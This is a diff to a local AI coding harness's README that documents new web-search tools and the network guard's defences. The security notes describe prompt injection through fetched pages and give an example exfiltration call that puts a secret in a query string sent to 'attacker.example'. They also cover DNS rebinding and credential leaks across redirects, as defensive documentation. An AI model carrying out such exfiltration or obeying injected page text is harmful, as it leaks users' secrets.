@@ -623,6 +623,8 @@ Offered only while internet access is on (`/net on`), so the model never sees a 
 | Tool | Description |
 |---|---|
 | `fetch_url` | Fetch an http/https URL and return the response as text. HTML is converted to readable text (scripts, styles and navigation dropped, link targets kept), JSON is pretty-printed. GET and HEAD run straight away; POST, PUT, PATCH and DELETE ask for confirmation first. |
+| `web_search` | Search keyless sources (Stack Overflow, Wikipedia, GitHub and MDN by default; npm, crates.io, Maven Central, PyPI and OSV by name) and check candidate URLs the model proposes. `read=true` also fetches the top pages and returns only the passages that match the query. See [Web search](#web-search). |
+| `add_search_source` | Add a search source that fits the project (docs.rs, a company Nexus, a Read the Docs project). It is dry-run first and usable for the session at once; keeping it asks you. |
 
 ### Coding mode only
 
@@ -724,7 +726,7 @@ Raising the budget rebuilds whatever was dropped. The estimate counts the index'
 
 ## Internet access
 
-`fetch_url` is the only tool that sends anything off your machine, so it is **off by default** and has to be turned on explicitly:
+`fetch_url` and `web_search` are the only tools that send anything off your machine, so they are **off by default** and have to be turned on explicitly:
 
 ```
 /net              # show the current state
@@ -735,7 +737,7 @@ Raising the budget rebuilds whatever was dropped. The estimate counts the index'
 
 Neither this nor `/net-confirm` is saved to `prefs.json`. Both reset to the safe default every launch, the same way `/tools` and `/run-confirm` do. `--net on` and `--net-confirm off` set them at startup.
 
-While it is on, a `NET:` badge shows in the TUI status bar and the web header, and the tool is added to whatever mode you are in. While it is off the model is not offered the tool at all.
+While it is on, a `NET:` badge shows in the TUI status bar and the web header, and `fetch_url`, `web_search` and `add_search_source` are added to whatever mode you are in. While it is off the model is not offered them at all. `web_search` goes through the same guard as `fetch_url`, so everything below applies to both; see [Web search](#web-search) for how it finds things.
 
 ### What is blocked
 
@@ -747,7 +749,7 @@ While it is on, a `NET:` badge shows in the TUI status bar and the web header, a
 
 ### Response size
 
-One response is capped at **100 KB** by default. Raise or lower it with a size, in bytes or with a unit (`kb`/`mb`, binary — 1 KB = 1024 bytes):
+One response is capped at **2 MB** by default. Raise or lower it with a size, in bytes or with a unit (`kb`/`mb`, binary — 1 KB = 1024 bytes):
 
 ```
 /net-max-bytes            # show the current cap
@@ -762,7 +764,8 @@ The model can pass `max_bytes` on an individual call, in the same units, but it 
 
 Raising this well past a megabyte is worth pairing with [`/tool-result`](#tool-result-cap): with the tool-result cap unlimited, one large fetch lands in the context whole. `/net-max-bytes` warns when you set a value where that matters.
 
-- **Credentials crossing an origin.** If a redirect leaves the host, changes port, or downgrades `https` to `http`, the `Authorization`, `Cookie` and API-key headers are dropped before the next hop. urllib's own redirect handler copies every header except `content-length`/`content-type`, so a token set for `api.example.com` would otherwise be replayed verbatim to whatever host it redirects to. When this happens the result says so, since the symptom is otherwise a confusing `401`.
+- **Credentials crossing an origin.** If a redirect leaves the host, changes port, or downgrades `https` to `http`, every header you set is dropped before the next hop except `Accept`, `Accept-Language`, `User-Agent` and `Content-Type`. urllib's own redirect handler copies every header except `content-length`/`content-type`, so a token set for `api.example.com` would otherwise be replayed verbatim to whatever host it redirects to, and a credential can hide under any name (`Private-Token`, `X-Goog-Api-Key`). When this happens the result names the dropped headers, since the symptom is otherwise a confusing `401`.
+- **DNS rebinding.** The connection is pinned to the exact addresses the guard approved, so a resolver that answers a public address for the check and `169.254.169.254` a moment later cannot redirect it. The hostname is still used for SNI and certificate validation.
 - **Control characters**, both in a URL you pass and in what a server sends back. Response headers, the status reason and the final URL are each reduced to one sanitised line, and the response body has C0, DEL and C1 controls stripped. Tool results are drawn into a curses TUI, so an ANSI escape from a web page is a terminal-injection vector no other tool here can produce.
 
 TLS certificates are verified, and there is deliberately no way to turn that off. Proxy environment variables are ignored: a proxy resolves the hostname itself, which would make every address check above meaningless.
@@ -779,9 +782,78 @@ The timeout is enforced across the whole redirect chain, not per hop, so a chain
 
 - **Prompt injection.** Fetched pages are wrapped in an explicit untrusted-content marker and a footer telling the model to treat them as data. The page cannot forge or reassemble the closing marker, and everything above it — status line, headers, notes — is sanitised, so a server cannot write into the region the model reads as harness output. None of that is a guarantee — a small local model has little injection resistance. **Turn on `/run-confirm on` when browsing**, so nothing a page suggests can reach your shell unseen.
 - **Exfiltration.** Blocking private addresses does nothing against `fetch_url("https://attacker.example/?d=<secret>")`. Confirming writes does not help either, since a GET query string leaks just as well. The real containment is that every URL appears in the transcript in both frontends — watch them.
-- **DNS rebinding.** The guard resolves and approves, then urllib resolves again when it connects; a hostile resolver can answer differently the second time. Closing that means pinning the address and hand-rolling the TLS connection, which this deliberately does not do.
+- **Rebinding around the write confirmation.** With `/net local` *and* `/net-confirm off`, the private-address check behind the forced confirmation resolves the name separately from the fetch. A hostile resolver could therefore get a write to a local service sent without the prompt. The web UI itself is protected by its Host-header check.
 
-Secret request headers (`Authorization`, `Cookie`, `X-API-Key`, …) are masked to `***` in the transcript, the session file and the log, but are sent as given.
+Secret request headers (`Authorization`, `Cookie`, `X-API-Key`, and any name containing auth, token, key, secret, cookie, session or passw) are masked to `***` in the transcript, the session file and the log, but are sent as given.
+
+## Web search
+
+`web_search` gives the model discovery without a search engine, an API key or Docker. It queries keyless domain APIs and checks URLs the model proposes. It is offered alongside `fetch_url` while `/net` is on and uses the same guard: the same address checks, pinning, size cap, cancel and untrusted-content fence.
+
+```
+web_search(query="python asyncio wait_for timeout", read=true,
+           urls=["https://docs.python.org/3/library/asyncio-task.html"])
+```
+
+- **`query` + `source`**: with no `source` the query goes, in parallel, to the default sources (Stack Overflow, Wikipedia, GitHub, MDN). Name one or several (`source="npm,crates"`) to search others. The result list gives each hit's title, URL, a one-line snippet and fields such as the latest version, at about 1.5k characters for six results.
+- **`urls`**: up to five pages the model thinks hold the answer. Each one is checked. A dead URL costs one line (`✗ … — HTTP 404`) instead of a whole `fetch_url` turn, and a live one is listed first with its best-matching passage as the snippet.
+- **`read=true`**: also fetches the top three pages and returns only the passages that match the query (BM25 over paragraphs and code blocks), within the `/net-max-chars` budget. For Stack Overflow it uses the accepted and top-voted answers from the API instead of the question page. The pages land in the `fetch_url` page cache, so a follow-up `fetch_url(url, find=...)` costs nothing.
+
+| Source | What it finds |
+|---|---|
+| `stackoverflow` (default) | Questions; `read=true` returns the top answers |
+| `wikipedia` (default) | Articles: concepts, algorithms, protocols |
+| `github` (default) | Repositories (unauthenticated: 10 searches a minute) |
+| `mdn` (default) | HTML, CSS, JavaScript and Web API docs |
+| `npm` | Packages with their latest version |
+| `crates` | Rust crates with their latest stable version |
+| `maven` | Maven Central artifacts with their latest version |
+| `pypi` | Exact package-name lookup (PyPI has no search API) |
+| `osv` | Known vulnerabilities; query `Ecosystem:package@version`, e.g. `PyPI:requests@2.19.0` |
+
+### Adding a source
+
+A source is a JSON file. Drop one into `~/.momo-harness/search_sources/` (or `search_sources/` in the harness checkout) and run `/search-sources reload`:
+
+```json
+{"name": "docsrs", "description": "Rust crate docs on docs.rs",
+ "url": "https://crates.io/api/v1/crates?q={query}&per_page={n}",
+ "results": "crates",
+ "title": "name", "link": "https://docs.rs/{name}", "snippet": "description",
+ "extra": {"version": "max_stable_version"}}
+```
+
+- **`url`** is an `https://` template with `{query}` and optionally `{n}`.
+- **`results`** is the dotted path to the list of hits (`""` for the top level; an object is treated as one hit).
+- **`title`, `link`, `snippet` and `extra`** are dotted paths within one hit. `link` may instead be a template whose `{placeholders}` are paths.
+- **Optional keys:** `headers` (no credentials), `"default": true` to include the source in plain searches, and `"hook"` to name a Python hook in `harness/search_sources.py` for APIs a template cannot express (Stack Exchange answer bodies, OSV's POST).
+
+A user file with a shipped name overrides the shipped one. The working directory is never read, so a cloned repository cannot add endpoints.
+
+**The model can propose sources too.** When the project calls for it, the model can register a source with `add_search_source`: docs.rs for a `Cargo.toml`, a `<repository>` from a `pom.xml`, a Read the Docs site. It first inspects the API with `fetch_url(url, json_path=...)`. The spec is then dry-run with a test query; a wrong path returns the keys that are there, so the model can fix it and retry. A source that passes is usable at once for the rest of the session. Keeping it (`save=true`) **always asks you**, even with `/net-confirm off`, and writes to `~/.momo-harness/search_sources/`. Model-proposed specs cannot use hooks, cannot be a default, cannot carry credential headers, and are limited to 10 per session.
+
+### Suggesting sources for a project
+
+`/search-sources suggest [focus]` asks the model to analyse the working directory and set up sources that fit it. It needs `/net on`.
+
+1. **The harness scans the working directory** and puts the result in the prompt:
+   - file types (an extension histogram) and the top-level layout;
+   - the start of the README and the headings of a few other documents;
+   - package manifests and build files;
+   - custom package repositories they name (a company Nexus in `pom.xml`, a private npm registry in `.npmrc`), with credentials, tokens and query strings stripped.
+2. **The model writes its opinion of the project first:** what it is, its domain and audience, and what someone working on it would look up. This covers libraries and registries, and also subject matter: terminology, reference works, papers, data. That makes the command useful beyond code: for a novel it proposes a thesaurus, Wikidata and Open Library, and for research notes it proposes Crossref or OpenAlex.
+3. **It adds 3 to 6 sources** with `add_search_source`. Each one is dry-run and then usable for the rest of the session. The prompt includes a dozen verified keyless APIs as starting points, split into code and subject matter.
+   - The ones the project's files call for come first, as **recommended**:
+     - docs.rs for a `Cargo.toml`;
+     - Docker Hub for a `Dockerfile`;
+     - Nexus and Artifactory search specs for a custom repository host;
+     - Wikidata, a thesaurus and Open Library when there is no code.
+   - A dry run must return at least one result, and a link that pastes a full URL into a template is rejected, so broken specs are caught before they are used.
+4. **It ends with a table** of what it added.
+
+Nothing is kept unless you say so: `/search-sources save <name>` (or `save all`) writes the session sources to `~/.momo-harness/search_sources/`. The focus text steers the model, e.g. `/search-sources suggest only our internal Nexus`.
+
+`/search-sources` lists every source with its origin (shipped, user, session), and `/search-sources rm <name>` removes a user or session source.
 
 ## Tests
 
@@ -976,6 +1048,11 @@ Type any command in the input bar:
 | `/net-confirm on\|off` | Ask y/N before each `fetch_url` POST/PUT/PATCH/DELETE (default: on) |
 | `/net-max-bytes` | Show the `fetch_url` response size cap |
 | `/net-max-bytes <size>` | Set it, in bytes or with a unit: `200000`, `500kb`, `2mb` |
+| `/search-sources` | List `web_search` sources and where each comes from — see [Web search](#web-search) |
+| `/search-sources suggest [focus]` | Have the model analyse the project (code or not), give its view of what you would look up, and add fitting sources for the session |
+| `/search-sources save <name>\|all` | Keep session sources for future sessions |
+| `/search-sources rm <name>` | Remove a user or session source |
+| `/search-sources reload` | Re-read the source files |
 | `/index` | Show the code index: memory against the budget, then its composition per part and per language, with bars like `/context` — see [Code index](#code-index) |
 | `/index on\|off` | Index the workdir in memory and give the model the `index_*` tools |
 | `/index rebuild` | Forget the index and build it again |
@@ -1054,7 +1131,7 @@ By default tool results are passed to the model without truncation. Set a cap to
 /tool-result 0        # disable cap (unlimited)
 ```
 
-`run_command` and `command_output` in run mode `new`, and `fetch_url`, are not cut: they size their own output (see [Command output](#command-output)).
+`run_command` and `command_output` in run mode `new`, `fetch_url` and `web_search` are not cut: they size their own output (see [Command output](#command-output)).
 
 Truncated results are cut at the last line boundary before the cap and display a notice: `... (truncated after N chars of M — use read_file with start_line/end_line for specific sections)` so the model knows more content exists and gets an actionable hint for how to retrieve the rest.
 
@@ -1090,6 +1167,7 @@ Everything momo keeps between runs lives in `~/.momo-harness/`. Nothing is sent 
 ├── index/<hash>.pickle      # saved code index per workdir (/index save, /index-persist)
 ├── index/<hash>.filter      # which files that workdir's index covers (/index-filter)
 ├── runs/<timestamp>/rN.log  # saved run_command output (/run-mode new), per session
+├── search_sources/*.json    # your web_search sources (/search-sources save, or add your own)
 └── tls/                     # only with --web-tls auto (folder 0700, keys 0600)
     ├── momo-ca.pem          # the CA certificate you trust on your devices
     ├── momo-ca.key          # the CA's private key — never share
@@ -1105,6 +1183,7 @@ Everything momo keeps between runs lives in `~/.momo-harness/`. Nothing is sent 
 | `sessions/*.log` | Every request, response, tool call and token count | Secret request headers are masked |
 | `index/*.pickle` | The code index, named by a hash of the workdir | Mode `0600`; only loaded if it is yours and not writable by others |
 | `runs/<session>/rN.log` | Full output of each `run_command` in run mode `new` | Last 20 per session; deleted on `/clear`, `/new` and session load; other sessions' folders removed after 3 days |
+| `search_sources/*.json` | Your own `web_search` sources: ones you wrote, and ones saved with `/search-sources save` | Loaded after the shipped sources; a file with a shipped name overrides it. Never read from the workdir. Specs may not hold credential headers |
 | `tls/` | momo's local CA and HTTPS certificate | Deleting it creates a new CA on the next `--web-tls auto` start; every device must trust it again |
 
 Elsewhere: `.momo-plan.md` in the workdir while a plan exists, `conversation-<timestamp>.md` from `/export`, and the web UI's theme, view and notification settings in each browser's `localStorage`. The `/token` value and the web UI access token are never stored anywhere.
